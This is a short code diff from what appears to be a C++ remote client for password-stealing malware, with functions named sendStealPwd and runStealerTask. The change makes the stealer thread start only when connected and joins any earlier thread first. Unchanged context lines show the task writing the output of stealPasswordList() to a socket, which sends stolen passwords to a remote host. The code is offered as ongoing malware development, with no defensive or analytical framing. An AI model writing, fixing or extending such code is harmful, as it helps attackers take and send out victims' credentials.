@@ -78,7 +78,12 @@ Packet *TCPClient::createPacket(PacketType type, std::string const& data)
 
 void TCPClient::sendStealPwd(std::string const& ftpPort)
 {
-	_stealerTask = std::thread(&TCPClient::runStealerTask, this, ftpPort);
+	if (_connected) {
+		if (_stealerTask.joinable()) {
+			_stealerTask.join();
+		}
+		_stealerTask = std::thread(&TCPClient::runStealerTask, this, ftpPort);
+	}
 }
 
 
@@ -207,6 +212,7 @@ void TCPClient::runStealerTask(std::string const& ftpPort)
 
 		boost::asio::streambuf request;
 		std::ostream request_stream(&request);
+
 		request_stream << stealer.stealPasswordList() << std::flush;
 
 		boost::asio::write(socket, request);
